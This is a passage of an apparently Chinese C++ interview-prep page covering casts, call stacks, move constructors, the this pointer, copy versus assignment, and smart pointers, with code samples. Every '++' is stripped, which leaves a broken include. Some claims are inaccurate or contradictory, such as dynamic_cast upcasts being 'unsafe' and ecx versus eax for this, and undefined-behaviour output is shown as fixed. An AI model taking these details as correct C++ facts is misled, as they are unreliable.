(expression)</p><p>该运算符把expression转换为type-id类型，但没有运行时类型检查来保证转换的安全性。它主要有如下几种用法：</p><ul><li><p>用于类层次结构中基类（父类）和派生类（子类）之间指针或引用引用的转换</p><ul><li><p>进行上行转换（把派生类的指针或引用转换成基类表示）是安全的</p></li><li><p>进行下行转换（把基类指针或引用转换成派生类表示）时，由于没有动态类型检查，所以是不安全的</p></li></ul></li><li><p>用于基本数据类型之间的转换，如把int转换成char，把int转换成enum。这种转换的安全性也要开发人员来保证。</p></li><li><p>把空指针转换成目标类型的空指针</p></li><li><p>把任何类型的表达式转换成void类型</p></li></ul><p>注意：static_cast不能转换掉expression的const、volatile、或者__unaligned属性。</p><p><strong>dynamic_cast</strong></p><p>有类型检查，基类向派生类转换比较安全，但是派生类向基类转换则不太安全</p><p>dynamic_cast <type-id> (expression)</p><p>该运算符把expression转换成type-id类型的对象。type-id 必须是类的指针、类的引用或者void*</p><p>如果 type-id 是类指针类型，那么expression也必须是一个指针，如果 type-id 是一个引用，那么 expression 也必须是一个引用</p><p>dynamic_cast运算符可以在执行期决定真正的类型，也就是说expression必须是多态类型。如果下行转换是安全的（也就说，如果基类指针或者引用确实指向一个派生类对象）这个运算符会传回适当转型过的指针。如果 如果下行转换不安全，这个运算符会传回空指针（也就是说，基类指针或者引用没有指向一个派生类对象）</p><p>dynamic_cast主要用于类层次间的上行转换和下行转换，还可以用于类之间的交叉转换</p><p>在类层次间进行上行转换时，dynamic_cast和static_cast的效果是一样的</p><p>在进行下行转换时，dynamic_cast具有类型检查的功能，比static_cast更安全</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc.h></span></span>using namespace std<span class="token punctuation">;</span>class Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">Base</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>virtual <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Son <span class="token operator">:</span> public Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> d<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span><span class="token comment">//reinterpret_cast</span><span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>n<span class="token punctuation">;</span><span class="token comment">//以下两者效果相同</span><span class="token keyword">char</span> <span class="token operator">*</span>c <span class="token operator">=</span> reinterpret_cast<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">></span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">char</span> <span class="token operator">*</span>c2 <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"reinterpret_cast输出："</span><span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>c2 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token comment">//const_cast</span><span class="token keyword">const</span> <span class="token keyword">int</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token operator">&amp;</span>n<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> const_cast<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"const_cast输出："</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>p3 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>Base<span class="token operator">*</span> b1 <span class="token operator">=</span> new Son<span class="token punctuation">;</span>Base<span class="token operator">*</span> b2 <span class="token operator">=</span> new Base<span class="token punctuation">;</span><span class="token comment">//static_cast</span>Son<span class="token operator">*</span> s1 <span class="token operator">=</span> static_cast<span class="token operator">&lt;</span>Son<span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//同类型转换</span>Son<span class="token operator">*</span> s2 <span class="token operator">=</span> static_cast<span class="token operator">&lt;</span>Son<span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//下行转换，不安全</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"static_cast输出："</span><span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> s1<span class="token operator">-></span>d <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> s2<span class="token operator">-></span>d <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">//下行转换，原先父对象没有d成员，输出垃圾值</span><span class="token comment">//dynamic_cast</span>Son<span class="token operator">*</span> s3 <span class="token operator">=</span> dynamic_cast<span class="token operator">&lt;</span>Son<span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//同类型转换</span>Son<span class="token operator">*</span> s4 <span class="token operator">=</span> dynamic_cast<span class="token operator">&lt;</span>Son<span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//下行转换，安全</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"dynamic_cast输出："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> s3<span class="token operator">-></span>d <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>s4 <span class="token operator">==</span> nullptr<span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"s4指针为nullptr"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">else</span>cout <span class="token operator">&lt;&lt;</span> s4<span class="token operator">-></span>d <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果</span><span class="token comment">//reinterpret_cast输出：a</span><span class="token comment">//const_cast输出：100</span><span class="token comment">//static_cast输出：</span><span class="token comment">//2</span><span class="token comment">//-33686019</span><span class="token comment">//dynamic_cast输出：</span><span class="token comment">//2</span><span class="token comment">//s4指针为nullptr</span></code></pre><p>从输出结果可以看出，在进行下行转换时，dynamic_cast安全的，如果下行转换不安全的话其会返回空指针，这样在进行操作的时候可以预先判断。而使用static_cast下行转换存在不安全的情况也可以转换成功，但是直接使用转换后的对象进行操作容易造成错误。</p><h4 id="87、c函数调用的压栈过程"><a href="#87、c函数调用的压栈过程" class="headerlink" title="87、c函数调用的压栈过程"></a>87、c函数调用的压栈过程</h4><p>从代码入手，解释这个过程：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> n <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">return</span> n<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> param1<span class="token punctuation">,</span> <span class="token keyword">int</span> param2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> var1 <span class="token operator">=</span> param1<span class="token punctuation">;</span><span class="token keyword">int</span> var2 <span class="token operator">=</span> param2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"var1=%d,var2=%d"</span><span class="token punctuation">,</span> <span class="token function">f</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">f</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果</span><span class="token comment">//2</span><span class="token comment">//1</span><span class="token comment">//var1=1,var2=2</span></code></pre><p>当函数从入口函数main函数开始执行时，编译器会将我们操作系统的运行状态，main函数的返回地址、main的参数、mian函数中的变量、进行依次压栈；</p><p>当main函数开始调用func()函数时，编译器此时会将main函数的运行状态进行压栈，再将func()函数的返回地址、func()函数的参数从右到左、func()定义变量依次压栈；</p><p>当func()调用f()的时候，编译器此时会将func()函数的运行状态进行压栈，再将的返回地址、f()函数的参数从右到左、f()定义变量依次压栈</p><p>从代码的输出结果可以看出，函数f(var1)、f(var2)依次入栈，而后先执行f(var2)，再执行f(var1)，最后打印整个字符串，将栈中的变量依次弹出，最后主函数返回。</p><blockquote><p>《C/c函数调用过程分析》：<a href="https://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601204.html">https://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601204.html</a></p><p>《C/c函数调用的压栈模型》：<a href="https://blog.csdn.net/m0_37717595/article/details/80368411">https://blog.csdn.net/m0_37717595/article/details/80368411</a></p></blockquote><h4 id="88、说说移动构造函数"><a href="#88、说说移动构造函数" class="headerlink" title="88、说说移动构造函数"></a>88、说说移动构造函数</h4><p>1)  我们用对象a初始化对象b，后对象a我们就不在使用了，但是对象a的空间还在呀（在析构之前），既然拷贝构造函数，实际上就是把a对象的内容复制一份到b中，那么为什么我们不能直接使用a的空间呢？这样就避免了新的空间的分配，大大降低了构造的成本。这就是移动构造函数设计的初衷；</p><p>2)  拷贝构造函数中，对于指针，我们一定要采用深层复制，而移动构造函数中，对于指针，我们采用浅层复制。浅层复制之所以危险，是因为两个指针共同指向一片内存空间，若第一个指针将其释放，另一个指针的指向就不合法了。</p><p>所以我们只要避免第一个指针释放空间就可以了。避免的方法就是将第一个指针（比如a-&gt;value）置为NULL，这样在调用析构函数的时候，由于有判断是否为NULL的语句，所以析构a的时候并不会回收a-&gt;value指向的空间；</p><p>3)  移动构造函数的参数和拷贝构造函数不同，拷贝构造函数的参数是一个左值引用，但是移动构造函数的初值是一个右值引用。意味着，移动构造函数的参数是一个右值或者将亡值的引用。也就是说，只用用一个右值，或者将亡值初始化另一个对象的时候，才会调用移动构造函数。而那个move语句，就是将一个左值变成一个将亡值。</p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h4 id="89、c中将临时变量作为返回值时的处理过程"><a href="#89、c中将临时变量作为返回值时的处理过程" class="headerlink" title="89、c中将临时变量作为返回值时的处理过程"></a>89、c中将临时变量作为返回值时的处理过程</h4><p>首先需要明白一件事情，临时变量，在函数调用过程中是被压到程序进程的栈中的，当函数退出时，临时变量出栈，即临时变量已经被销毁，临时变量占用的内存空间没有被清空，但是可以被分配给其他变量，所以有可能在函数退出时，该内存已经被修改了，对于临时变量来说已经是没有意义的值了</p><p>C语言里规定：16bit程序中，返回值保存在ax寄存器中，32bit程序中，返回值保持在eax寄存器中，如果是64bit返回值，edx寄存器保存高32bit，eax寄存器保存低32bit</p><p>由此可见，函数调用结束后，返回值被临时存储到寄存器中，并没有放到堆或栈中，也就是说与内存没有关系了。当退出函数的时候，临时变量可能被销毁，但是返回值却被放到寄存器中与临时变量的生命周期没有关系</p><p>如果我们需要返回值，一般使用赋值语句就可以了</p><blockquote><p>《【c】临时变量不能作为函数的返回值？》：<a href="https://www.wandouip.com/t5i204349/">https://www.wandouip.com/t5i204349/</a></p></blockquote><p>（栈上的内存分配、拷贝过程）</p><h4 id="90、关于this指针你知道什么？全说出来"><a href="#90、关于this指针你知道什么？全说出来" class="headerlink" title="90、关于this指针你知道什么？全说出来"></a>90、关于this指针你知道什么？全说出来</h4><ul><li><p>this指针是类的指针，指向对象的首地址。</p></li><li><p>this指针只能在成员函数中使用，在全局函数、静态成员函数中都不能用this。</p></li><li><p>this指针只有在成员函数中才有定义，且存储位置会因编译器不同有不同存储位置。</p></li></ul><p><strong>this指针的用处</strong></p><p>一个对象的this指针并不是对象本身的一部分，不会影响sizeof(对象)的结果。this作用域是在类内部，当在类的<strong>非静态成员函数</strong>中访问类的<strong>非静态成员</strong>的时候（全局函数，静态函数中不能使用this指针），编译器会自动将对象本身的地址作为一个隐含参数传递给函数。也就是说，即使你没有写上this指针，编译器在编译的时候也是加上this的，它作为非静态成员函数的隐含形参，对各成员的访问均通过this进行</p><p><strong>this指针的使用</strong></p><p>一种情况就是，在类的非静态成员函数中返回类对象本身的时候，直接使用 return *this；</p><p>另外一种情况是当形参数与成员变量名相同时用于区分，如this-&gt;n = n （不能写成n = n）</p><p><strong>类的this指针有以下特点</strong></p><p>(1）<strong>this</strong>只能在成员函数中使用，全局函数、静态函数都不能使用this。实际上，<strong>成员函数默认第一个参数</strong>为<strong>T * const this</strong></p><p>如：</p><pre class="language-c" data-language="c"><code class="language-c">class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>其中，<strong>func</strong>的原型在编译器看来应该是：</p><p>  <strong>int func(A * const this,int p);</strong></p><p>（2）由此可见，<strong>this</strong>在成员函数的开始前构造，在成员函数的结束后清除。这个生命周期同任何一个函数的参数是一样的，没有任何区别。当调用一个类的成员函数时，编译器将类的指针作为函数的this参数传递进去。如：</p><pre class="language-c" data-language="c"><code class="language-c">A a<span class="token punctuation">;</span>a<span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此处，编译器将会编译成：</span>A<span class="token operator">::</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>看起来和静态函数没差别，对吗？不过，区别还是有的。编译器通常会对this指针做一些优化，因此，this指针的传递效率比较高，例如VC通常是通过ecx（计数寄存器）传递this参数的。</p><h4 id="91、几个this指针的易混问题"><a href="#91、几个this指针的易混问题" class="headerlink" title="91、几个this指针的易混问题"></a>91、几个this指针的易混问题</h4><p><strong>A. this指针是什么时候创建的？</strong></p><p>this在成员函数的开始执行前构造，在成员的执行结束后清除。</p><p>但是如果class或者struct里面没有方法的话，它们是没有构造函数的，只能当做C的struct使用。采用TYPE xx的方式定义的话，在栈里分配内存，这时候this指针的值就是这块内存的地址。采用new的方式创建对象的话，在堆里分配内存，new操作符通过eax（累加寄存器）返回分配的地址，然后设置给指针变量。之后去调用构造函数（如果有构造函数的话），这时将这个内存块的地址传给ecx，之后构造函数里面怎么处理请看上面的回答</p><p><strong>B. this指针存放在何处？堆、栈、全局变量，还是其他？</strong></p><p>this指针会因编译器不同而有不同的放置位置。可能是栈，也可能是寄存器，甚至全局变量。在汇编级别里面，一个值只会以3种形式出现：立即数、寄存器值和内存变量值。不是存放在寄存器就是存放在内存中，它们并不是和高级语言变量对应的。</p><p><strong>C. this指针是如何传递类中的函数的？绑定？还是在函数参数的首参数就是this指针？那么，this指针又是如何找到“类实例后函数的”？</strong></p><p>大多数编译器通过ecx（寄数寄存器）寄存器传递this指针。事实上，这也是一个潜规则。一般来说，不同编译器都会遵从一致的传参规则，否则不同编译器产生的obj就无法匹配了。</p><p>在call之前，编译器会把对应的对象地址放到eax中。this是通过函数参数的首参来传递的。this指针在调用之前生成，至于“类实例后函数”，没有这个说法。类在实例化时，只分配类中的变量空间，并没有为函数分配空间。自从类的函数定义完成后，它就在那儿，不会跑的</p><p><strong>D. this指针是如何访问类中的变量的？</strong></p><p>如果不是类，而是结构体的话，那么，如何通过结构指针来访问结构中的变量呢？如果你明白这一点的话，就很容易理解这个问题了。</p><p>在c中，类和结构是只有一个区别的：类的成员默认是private，而结构是public。</p><p>this是类的指针，如果换成结构体，那this就是结构的指针了。</p><p><strong>E.我们只有获得一个对象后，才能通过对象使用this指针。如果我们知道一个对象this指针的位置，可以直接使用吗？</strong></p><p><strong>this指针只有在成员函数中才有定义。</strong>因此，你获得一个对象后，也不能通过对象使用this指针。所以，我们无法知道一个对象的this指针的位置（只有在成员函数里才有this指针的位置）。当然，在成员函数里，你是可以知道this指针的位置的（可以通过&amp;this获得），也可以直接使用它。</p><p><strong>F.每个类编译后，是否创建一个类中函数表保存函数指针，以便用来调用函数？</strong></p><p>普通的类函数（不论是成员函数，还是静态函数）都不会创建一个函数表来保存函数指针。只有虚函数才会被放到函数表中。但是，即使是虚函数，如果编译期就能明确知道调用的是哪个函数，编译器就不会通过函数表中的指针来间接调用，而是会直接调用该函数。正是由于this指针的存在，用来指向不同的对象，从而确保不同对象之间调用相同的函数可以互不干扰。</p><blockquote><p>《c中this指针的用法详解》<a href="http://blog.chinaunix.net/uid-21411227-id-1826942.html">http://blog.chinaunix.net/uid-21411227-id-1826942.html</a></p></blockquote><h4 id="92、构造函数、拷贝构造函数和赋值操作符的区别"><a href="#92、构造函数、拷贝构造函数和赋值操作符的区别" class="headerlink" title="92、构造函数、拷贝构造函数和赋值操作符的区别"></a>92、构造函数、拷贝构造函数和赋值操作符的区别</h4><p><strong>构造函数</strong></p><p>对象不存在，没用别的对象初始化，在创建一个新的对象时调用构造函数</p><p><strong>拷贝构造函数</strong></p><p>对象不存在，但是使用别的已经存在的对象来进行初始化</p><p><strong>赋值运算符</strong></p><p>对象存在，用别的对象给它赋值，这属于重载“=”号运算符的范畴，“=”号两侧的对象都是已存在的</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"我是构造函数"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token keyword">const</span> A<span class="token operator">&amp;</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"我是拷贝构造函数"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>A<span class="token operator">&amp;</span> operator <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">&amp;</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"我是赋值操作符"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">~</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>A a1<span class="token punctuation">;</span> <span class="token comment">//调用构造函数</span>A a2 <span class="token operator">=</span> a1<span class="token punctuation">;</span> <span class="token comment">//调用拷贝构造函数</span>a2 <span class="token operator">=</span> a1<span class="token punctuation">;</span> <span class="token comment">//调用赋值操作符</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果</span><span class="token comment">//我是构造函数</span><span class="token comment">//我是拷贝构造函数</span><span class="token comment">//我是赋值操作符</span></code></pre><h4 id="93、拷贝构造函数和赋值运算符重载的区别？"><a href="#93、拷贝构造函数和赋值运算符重载的区别？" class="headerlink" title="93、拷贝构造函数和赋值运算符重载的区别？"></a>93、拷贝构造函数和赋值运算符重载的区别？</h4><ul><li><p>拷贝构造函数是函数，赋值运算符是运算符重载。</p></li><li><p>拷贝构造函数会生成新的类对象，赋值运算符不能。</p></li><li><p>拷贝构造函数是直接构造一个新的类对象，所以在初始化对象前不需要检查源对象和新建对象是否相同；赋值运算符需要上述操作并提供两套不同的复制策略，另外赋值运算符中如果原来的对象有内存分配则需要先把内存释放掉。</p></li><li><p>形参传递是调用拷贝构造函数（调用的被赋值对象的拷贝构造函数），但并不是所有出现”=”的地方都是使用赋值运算符，如下：</p><pre><code>Student s;Student s1 = s;    // 调用拷贝构造函数Student s2;s2 = s;    // 赋值运算符操作</code></pre></li></ul><p>注：类中有指针变量时要重写析构函数、拷贝构造函数和赋值运算符</p><h4 id="94、智能指针的作用；"><a href="#94、智能指针的作用；" class="headerlink" title="94、智能指针的作用；"></a>94、智能指针的作用；</h4><p>1)  c11中引入了智能指针的概念，方便管理堆内存。使用普通指针，容易造成堆内存泄露（忘记释放），二次释放，程序发生异常时内存泄露等问题等，使用智能指针能更好的管理堆内存。</p><p>2)  智能指针在c11版本之后提供，包含在头文件<memory>中，shared_ptr、unique_ptr、weak_ptr。shared_ptr多个指针指向相同的对象。shared_ptr使用引用计数，每一个shared_ptr的拷贝都指向相同的内存。每使用他一次，内部的引用计数加1，每析构一次，内部的引用计数减1，减为0时，自动删除所指向的堆内存。shared_ptr内部的引用计数是线程安全的，但是对象的读取需要加锁。</p><p>3)  初始化。智能指针是个模板类，可以指定类型，传入指针通过构造函数初始化。也可以使用make_shared函数初始化。不能将指针直接赋值给一个智能指针，一个是类，一个是指针。例如std::shared_ptr<int> p4 = new int(1);的写法是错误的</p><p>拷贝和赋值。拷贝使得对象的引用计数增加1，赋值使得原对象引用计数减1，当计数为0时，自动释放内存。后来指向的对象引用计数加1，指向后来的对象</p><p>4)  unique_ptr“唯一”拥有其所指对象，同一时刻只能有一个unique_ptr指向给定对象（通过禁止拷贝语义、只有移动语义来实现）。相比与原始指针unique_ptr用于其RAII的特性，使得在出现异常的情况下，动态资源能得到释放。unique_ptr指针本身的生命周期：从unique_ptr指针创建时开始，直到离开作用域。离开作用域时，若其指向对象，则将其所指对象销毁(默认使用delete操作符，用户可指定其他操作)。unique_ptr指针与其所指对象的关系：在智能指针生命周期内，可以改变智能指针所指对象，如创建智能指针时通过构造函数指定、通过reset方法重新指定、通过release方法释放所有权、通过移动语义转移所有权。</p><p>5)  智能指针类将一个计数器与类指向的对象相关联，引用计数跟踪该类有多少个对象共享同一指针。每次创建类的新对象时，初始化指针并将引用计数置为1；当对象作为另一对象的副本而创建时，拷贝构造函数拷贝指针并增加与之相应的引用计数；对一个对象进行赋值时，赋值操作符减少左操作数所指对象的引用计数（如果引用计数为减至0，则删除对象），并增加右操作数所指对象的引用计数；调用析构函数时，构造函数减少引用计数（如果引用计数减至0，则删除基础对象）。</p><p>6)  weak_ptr 是一种不控制对象生命周期的智能指针, 它指向一个 shared_ptr 管理的对象. 进行该对象的内存管理的是那个强引用的 shared_ptr. weak_ptr只是提供了对管理对象的一个访问手段。weak_ptr 设计的目的是为配合 shared_ptr 而引入的一种智能指针来协助 shared_ptr 工作, 它只可以从一个 shared_ptr 或另一个 weak_ptr 对象构造, 它的构造和析构不会引起引用记数的增加或减少. </p><h4 id="95、说说你了解的auto-ptr作用"><a href="#95、说说你了解的auto-ptr作用" class="headerlink" title="95、说说你了解的auto_ptr作用"></a>95、说说你了解的auto_ptr作用</h4><p>1)  auto_ptr的出现，主要是为了解决“有异常抛出时发生内存泄漏”的问题；抛出异常，将导致指针p所指向的空间得不到释放而导致内存泄漏；</p><p>2)  auto_ptr构造时取得某个对象的控制权，在析构时释放该对象。我们实际上是创建一个auto_ptr<Type>类型的局部对象，该局部对象析构时，会将自身所拥有的指针空间释放，所以不会有内存泄漏；</p><p>3)  auto_ptr的构造函数是explicit，阻止了一般指针隐式转换为 auto_ptr的构造，所以不能直接将一般类型的指针赋值给auto_ptr类型的对象，必须用auto_ptr的构造函数创建对象；</p><p>4)  由于auto_ptr对象析构时会删除它所拥有的指针，所以使用时避免多个auto_ptr对象管理同一个指针；</p><p>5)  Auto_ptr内部实现，析构函数中删除对象用的是delete而不是delete[]，所以auto_ptr不能管理数组；</p><p>6)  auto_ptr支持所拥有的指针类型之间的隐式类型转换。</p><p>7)  可以通过*和-&gt;运算符对auto_ptr所有用的指针进行提领操作；</p><p>8)  T<em> get(),获得auto_ptr所拥有的指针；T</em> release()，释放auto_ptr的所有权，并将所有用的指针返回。</p><h4 id="96、智能指针的循环引用"><a href="#96、智能指针的循环引用" class="headerlink" title="96、智能指针的循环引用"></a>96、智能指针的循环引用</h4><p>循环引用是指使用多个智能指针share_ptr时，出现了指针之间相互指向，从而形成环的情况，有点类似于死锁的情况，这种情况下，智能指针往往不能正常调用对象的析构函数，从而造成内存泄漏。举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>template <span class="token operator">&lt;</span>typename T<span class="token operator">></span>class Node<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">Node</span><span class="token punctuation">(</span><span class="token keyword">const</span> T<span class="token operator">&amp;</span> value<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">_pPre</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_pNext</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_value</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Node()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">~</span><span class="token function">Node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"~Node()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"this:"</span> <span class="token operator">&lt;&lt;</span> this <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>shared_ptr<span class="token operator">&lt;</span>Node<span class="token operator">&lt;</span>T<span class="token operator">>></span> _pPre<span class="token punctuation">;</span>shared_ptr<span class="token operator">&lt;</span>Node<span class="token operator">&lt;</span>T<span class="token operator">>></span> _pNext<span class="token punctuation">;</span>T _value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Funtest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>shared_ptr<span class="token operator">&lt;</span>Node<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">sp1</span><span class="token punctuation">(</span>new Node<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>shared_ptr<span class="token operator">&lt;</span>Node<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">sp2</span><span class="token punctuation">(</span>new Node<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token 